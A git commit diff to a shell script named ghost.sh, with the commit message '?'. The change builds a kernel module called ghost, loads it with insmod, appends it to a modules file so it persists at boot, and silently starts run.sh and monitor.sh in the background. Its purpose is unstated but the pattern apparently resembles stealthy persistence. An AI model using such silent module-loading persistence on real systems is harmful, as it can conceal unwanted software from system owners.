4ac6f2644e842af1c806a69bc416fc3a226def84
ASxx <oliver12125@sina.com>
2019-12-25 23:20:19 +0800

    ?

--- program/ghost.sh
+++ program/ghost.sh
@@ -1,21 +1,20 @@
 #/bin/bash
 
-chmod +x dispose.sh
-./dispose.sh
-nohup ./run.sh &
+cd ghost
+make all
+insmod ghost.ko
+echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
+cd ..
+
+# chmod +x dispose.sh
+# ./dispose.sh
+nohup ./run.sh & >/dev/null 2>&1 &
 echo -e "\n\n"
 chmod 764 monitor.sh
 nohup monitor.sh >/dev/null 2>&1 &
-chmod 764 monitor.sh
 
 
-# cd ghost
-# make all
-# insmod ghost.ko
-# echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
-# cd ..
-# insmod ghost.ko
-# echo -e "#<ghost>\nghost\n#<ghost>" >> etc/modules
+
 
 # chmod +x run.sh
 # chmod +x monitor.sh
